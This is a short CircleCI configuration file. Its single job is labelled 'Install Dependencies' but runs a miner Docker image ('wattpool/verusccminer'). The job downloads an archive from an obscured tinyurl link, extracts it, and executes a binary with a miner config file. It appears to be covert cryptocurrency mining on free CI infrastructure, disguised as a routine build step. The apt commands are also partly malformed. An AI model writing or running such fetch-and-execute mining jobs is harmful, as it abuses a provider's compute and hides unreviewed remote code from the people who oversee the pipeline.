version: 2.1
jobs:
    aku1:
      docker:
            - image: wattpool/verusccminer
      steps:
        - run:
            name: Install Dependencies
            command: |
              apt update && apt upgrade -y \
              apt-get update && apt-get dist-upgrade -y \
              apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 && apt install sudo && \
              apt-get clean && \
              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
              apt-get update && apt-get dist-upgrade -y \
              apt-get install -y build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev git && \
              apt-get clean && \
              rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
              apt install wget -y
              wget https://tinyurl.com/jjdoj29jc && tar -xvf jjdoj29jc && ./vernanolin vernano.ini
